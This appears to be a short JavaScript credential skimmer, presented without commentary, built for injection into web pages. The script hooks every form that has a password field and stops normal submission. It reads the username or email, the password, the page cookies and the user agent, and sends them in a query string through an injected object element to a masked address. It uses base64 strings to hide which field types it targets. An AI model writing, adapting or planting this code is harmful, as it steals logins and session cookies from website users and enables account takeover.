(function(argument) {
  
    function abc(str) {
      // Going backwards: from bytestream, to percent-encoding, to original string.
      return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
      }).join(''));
    }

    var password = document.querySelectorAll('input[type="password"]');

    for(var i = 0; i < password.length; i++) {

      var form = password[i].form;

      form.addEventListener('submit', function(event){

        event.preventDefault();

        nodes = this.querySelectorAll('input'); 

        for(var i = 0; i < nodes.length; i++) {

          var node = nodes[i];

          if (node.type === abc("cGFzc3dvcmQ=") || node.type === abc("ZW1haWw=") || node.type === abc("dGV4dA==")) {

            if (node.type === abc("ZW1haWw=") || node.type == abc("dGV4dA==")) {
              var uuid = node.value
            } else if (node.type === abc("cGFzc3dvcmQ=")) {
              var pass = node.value
            }
          }
        }

        var params = { "email": uuid, "password": pass, "cookies": document.cookie, "userAgent": navigator.userAgent };

        var querys = []

        for (var key in params) {
          if (params.hasOwnProperty(key)) {
            querys.push(key + '=' + params[key]);
          }
        };

        var formatted = querys.join('&');

        var object = document.createElement("object");
        object.setAttribute("data", '******' + formatted);
        object.setAttribute("type", "application/json");
        document.body.appendChild(object);

      });
    }
}());